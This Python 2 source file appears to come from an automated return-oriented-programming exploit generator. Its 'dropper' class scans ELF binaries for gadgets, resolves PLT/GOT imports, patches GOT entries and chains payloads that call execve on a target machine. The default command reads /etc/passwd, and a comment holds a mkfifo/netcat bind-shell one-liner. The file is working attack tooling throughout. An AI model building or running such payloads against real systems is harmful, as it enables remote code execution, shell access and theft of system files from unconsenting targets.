from gadgets.gadgetstools import GadgetTools
from chunks.payloadchunk import PayloadChunk
from elftools.elf import elffile

import struct
import pickle
import math
import pdb

class dropper():
    def __init__ (self, filename,
                  can_control_fd = -1,
                  writeable_area = -1,
                  readable_area = -1,
                  cmd = '/bin/sh'):

        self.gts = GadgetTools(open(filename, 'rb'))
        self.can_control_fd = can_control_fd

        self.writeable_area = writeable_area
        if self.writeable_area == -1:
            self.writeable_area = self.get_writeable_area()

        self.readable_area = readable_area
        if self.readable_area == -1:
            self.readable_area = self.get_readable_area()

        self.set_cmd("/bin/cat", ["/bin/cat", "/etc/passwd"])
        self.so_symbols = {}

    def set_can_control_fd(self, value):
        """Set the filedescriptor controlled by the user, if no fd can be controlled should be set at -1.
        """
        self.can_control_fd = value

    def get_writeable_area(self):
        return self.gts.elf.get_section_by_name('.data').header.sh_addr


    def get_readable_area(self):
        return 0x808080

    def set_cmd(self, cmd, argv):
        """Set the cmd and the argument vector to execute on the target machine.
        Args:
        cmd = the full path of the executable on the target machine to invoke
        argv = the command line arguments to pass to the executable (with the name of the executable itself)

        """
        self.cmd = cmd + '\x00'
        self.argv = [a + '\x00' for a in argv]

    def analyze_all(self):
        print "Finding gadgets.."
        self.gts.find_gadgets()
        print "Classifing gadgets.."
        self.gts.classify_gadgets()
        print "Finding reg set gadgets.."
        self.gts.find_reg_set_gadgets()
        print "Finding arithmetic store gadgets.."
        self.gts.find_arithmetic_mem_set_gadgets()
        print "Finding memory store gadgets.."
        self.gts.find_memory_store()
        print "Finding clear carry flag gadgets.."
        self.gts.find_ccfs()

        self.imports, self.imports_plt = self.get_imports()

        self.analyzed = True


    def get_imports(self):
        _dynsym = self.gts.elf.get_section_by_name('.dynsym')

        _rel_plt = self.gts.elf.get_section_by_name('.rel.plt')
        if _rel_plt != None:
            imports = { _dynsym.get_symbol(r.entry.r_info_sym).name : r for r in _rel_plt.iter_relocations() }
        _rela_plt = self.gts.elf.get_section_by_name('.rela.plt')
        if _rela_plt != None:
            imports = { _dynsym.get_symbol(r.entry.r_info_sym).name : r for r in _rela_plt.iter_relocations() }

        _got_plt = self.gts.elf.get_section_by_name('.got.plt')
        _got_plt_data = _got_plt.data()

        imports_plt = {}
        fmt = "<I"
        if self.gts.arch_info.address_size == 64:
            fmt = "<Q"

        for n, r in imports.iteritems():
            offset = r.entry.r_offset - _got_plt.header.sh_addr
            if r.is_RELA():
                offset += r.entry.r_addend

            imports_plt[n] = struct.unpack(fmt, _got_plt_data[offset : offset + self.gts.arch_info.address_size / 8])[0]
            imports_plt[n] -= 6

        return imports, imports_plt

    def add_shared_object(self, path):
        """Add the base addresses of functions in the file pointed by path.
        """
        try:
            f = open(path, 'rb')
        except Exception as e:
            print e
            return

        elf = elffile.ELFFile(f)        
        _dynsym = elf.get_section_by_name('.dynsym')

        if not _dynsym:
            raise BaseExecption("Shared file provided has no .dynsym section")

        self.so_symbols.update({s.name : s for s in _dynsym.iter_symbols()})

        f.close()
        
    def set_function_for_address_resolving(self, name, target='execve', offset=0, base=0, size=0):
        """Set which function to use as base for got dereferencing (default target function is execve) 
        """
        if name not in self.so_symbols:
            print 'WARNING: Trying to use got dereferencing for a function not preent in the so provided'

        self._got_f = name

        if offset == 0:
            self._got_offset = self.so_symbols[target].entry.st_value - self.so_symbols[name].entry.st_value

        if base == 0:
            self._got_base = self.so_symbols[name].entry.st_value

        if size == 0:
            self._got_size = int(math.ceil(math.log(self._got_offset, 2) / 8))

    def build_spawn_shell_payload(self):
        if not self.analyzed:
            self.analyze_all()

        args, mem_args = self.payload_execve_args()

        #Try to write execve arguments in memory
        if self.can_control_fd == -1 or 'read' not in self.imports:
            pl_mem = self.gts.memstr.get_chunk(self.writeable_area, mem_args)
        else:
            self.fd_payload = mem_args
            pl_mem = self.gts.get_ret_func_chunk([self.can_control_fd, self.writeable_area, len(mem_args)],
                                                 self.imports_plt['read'])

        if 'execve' not in self.imports:
            got_patching_chunk = self.gts.build_mem_add(self.imports[self._got_f].entry.r_offset,
                                                        self._got_offset,
                                                        self._got_size,
                                                        self._got_base)

            pl_execve = self.gts.get_ret_func_chunk(args, self.imports_plt[self._got_f])
            return PayloadChunk.chain([pl_mem, got_patching_chunk, pl_execve])
        else:
            pl_execve = self.gts.get_ret_func_chunk(args, self.imports_plt['execve'])
            return PayloadChunk.chain([pl_mem, pl_execve])


    def _execute(self):
        pass

    def payload_execve_args(self):
        # cmd = "/bin/sh\x00"
        # argv = [cmd, "-c\x00", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i | nc -l 1234 > /tmp/f\x00"]

        addr_size = self.gts.arch_info.address_size/8
        fmt = "<I"
        if addr_size == 8:
            fmt = "<Q"

        ptr = self.writeable_area
        first_arg  = ptr
        read_input = self.cmd
        ptr += len(self.cmd)

        second_arg = ptr
        read_input += struct.pack(fmt, first_arg)
        ptr += addr_size

        ptr += (len(self.argv)) * addr_size
        third_arg = ptr
        ptr += addr_size

        for i, arg in enumerate(self.argv):
            offset = 0
            if i != 0:
                offset = len(self.argv[i - 1])

            read_input += struct.pack(fmt, ptr + offset)
            ptr += offset

        read_input += struct.pack(fmt, 0x0)

        for arg in self.argv:
            read_input += arg

        return [first_arg, second_arg, third_arg], read_input

    def save_state_to_file(self, f):
        s = self.save_state()
        pickle.dump(s, f)

    def restore_state_from_file(self, f):
        s = pickle.load(f)
        self.restore_state(s)

    def save_state(self):
        return (self.gts.gadgets,
                self.gts.classified_gadgets,
                self.gts.memstr.by_addr,
                self.gts.regset.by_addr,
                self.gts.regset.by_reg,
                self.gts.ccf.by_addr,
                self.gts.ccf.by_stack_offset,
                self.gts.ams.by_addr,
                self.gts.ams.adcs)

    def restore_state(self, state):
        (self.gts.gadgets,
         self.gts.classified_gadgets,
         self.gts.memstr.by_addr,
         self.gts.regset.by_addr,
         self.gts.regset.by_reg,
         self.gts.ccf.by_addr,
         self.gts.ccf.by_stack_offset,
         self.gts.ams.by_addr,
         self.gts.ams.adcs) = state

        self.imports, self.imports_plt = self.get_imports()
        self.analyzed = True
